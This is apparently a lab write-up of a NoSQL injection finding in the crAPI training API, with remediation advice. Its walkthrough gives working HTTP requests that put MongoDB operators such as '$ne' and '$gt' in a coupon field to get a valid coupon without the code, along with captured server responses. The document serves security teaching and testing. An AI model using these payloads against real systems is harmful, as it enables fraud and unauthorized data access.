[🇧🇷 Português](../../vulnerabilidades/09-nosql-injection.md) · 🇺🇸 English

# NoSQL Injection — Free coupon without knowing the code

**OWASP API Security Top 10 (2023) category:** Injection — not a standalone category in the 2023 Top 10 (it was `API8:2019 — Injection`); today it falls under unvalidated input / implementation flaw.
**Estimated severity:** `High`
**Matching crAPI challenge:** Challenge 12 — "find a way to get coupons for free without the code"

---

## 1. Summary

The coupon-validation endpoint builds a **MongoDB** query directly from the client-supplied `coupon_code` field. Instead of a string, the attacker sends a **MongoDB operator** (e.g. `{"$ne": "x"}`), which makes the query match any document and return a valid coupon — **without knowing any code**.

## 2. Preconditions

- Any authenticated account (with a valid token).

## 3. Exploitation walkthrough

1. A legitimate request sends the code as a string:

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": "TRAC075" }
```

2. Replace the string with a **MongoDB operator**. Since the value is used raw in the query, the operator is interpreted by the database:

```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{ "coupon_code": { "$ne": "x" } }
```

The query becomes something like `db.coupons.findOne({ coupon_code: { $ne: "x" } })`, which matches the first existing coupon and returns it.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/09-nosql-injection/captura.txt`](../../../evidencias/09-nosql-injection/captura.txt).

```
1) coupon_code = "NAOEXISTE123" (string)   -> HTTP 500 / no coupon
2) coupon_code = {"$ne":"x"}               -> HTTP 200
   {"coupon_code":"TRAC075","amount":"75","CreatedAt":"..."}
3) coupon_code = {"$gt":""}                -> HTTP 200  (same coupon)
```

With an operator in place of the string, the server returned a valid coupon (`TRAC075`, 75 credit) **without the attacker knowing the code**.

## 5. Why it is a risk

It allows obtaining benefits (coupons/discounts) fraudulently and, depending on the query, **extracting or bypassing** database data. NoSQL injection is often underestimated by those who think "NoSQL databases don't have injection" — but building queries from untyped/unvalidated input is just as dangerous as concatenating SQL.

## 6. How to fix

- **Validate the type** of the input: `coupon_code` must be a **string**, rejecting objects/operators.
- Use parameterized queries / query builders that treat the input as a literal value, never as a query fragment.
- Apply a validation schema (e.g. JSON Schema) at the API edge.

## 7. References

- [OWASP — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
